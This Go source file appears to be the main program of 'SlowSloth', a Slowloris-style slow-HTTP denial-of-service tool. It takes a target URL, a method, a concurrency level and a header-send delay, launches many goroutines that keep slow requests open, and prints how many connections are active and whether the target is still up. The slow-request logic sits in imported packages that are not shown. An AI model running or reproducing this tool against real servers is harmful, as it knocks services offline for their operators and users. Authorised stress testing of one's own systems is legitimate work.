package main

import (
	"SlowSloth/pkg/servicechecker"
	slowrequest "SlowSloth/pkg/slowrequester"
	"SlowSloth/pkg/statusprinter"
	"flag"
	"fmt"
	"net/http"
	"net/url"
	"os"
	"sync"
	"time"
)

func main() {
	urlString := flag.String("u", "", "Target URL")
	method := flag.String("m", "GET", "HTTP Method: GET or POST")
	data := flag.String("d", "", "Data for POST request")
	concurrency := flag.Int("c", 1, "Number of concurrent requests")
	delay := flag.Int("delay", 10, "Delay in seconds between header sends")
	flag.Parse()

	if *urlString == "" {
		fmt.Println("A URL must be provided with the -u flag.")
		return
	}
	urlObj, err := url.Parse(*urlString)
	if err != nil {
		fmt.Println("Invalid URL:", err)
		return
	}

	if !isServiceAvailable(*urlString) {
		fmt.Println("Error: Service is not available at startup.")
		os.Exit(1) // Exit the program if the service is not available
	}

	var strategy slowrequest.RequestStrategy
	switch *method {
	case "GET":
		strategy = &slowrequest.GetRequestStrategy{}
	case "POST":
		strategy = &slowrequest.PostRequestStrategy{Body: *data}
	default:
		fmt.Println("Invalid method:", *method)
		return
	}

	statusManager := statusprinter.NewStatusManager()
	requestManager := slowrequest.NewRequestManager(strategy, statusManager)

	var wg sync.WaitGroup
	wg.Add(*concurrency)

	for i := 0; i < *concurrency; i++ {
		go requestManager.SendSlowRequest(&wg, urlObj, time.Duration(*delay)*time.Second)
	}

	// Initialize and start the service checker
	serviceChecker := servicechecker.NewServiceChecker(*urlString, statusManager, 10*time.Second)
	go serviceChecker.CheckServiceAvailability()

	// Start a goroutine to continuously print the status
	go func() {
		for {
			fmt.Printf("\rTotal active connections: %d, Service availability: %t",
				statusManager.ActiveConnections(),
				statusManager.IsServiceAvailable())
			time.Sleep(500 * time.Millisecond)
		}
	}()

	// Wait for all requests to complete
	wg.Wait()

	// Add a delay to see the final status before the program exits
	time.Sleep(1 * time.Second)
	fmt.Println("\nAll requests completed.")
}

func isServiceAvailable(url string) bool {
	client := http.Client{

		Timeout: 5 * time.Second,
	}
	resp, err := client.Get(url)
	if err != nil {
		return false
	}
	defer resp.Body.Close()
	return resp.StatusCode == http.StatusOK
}
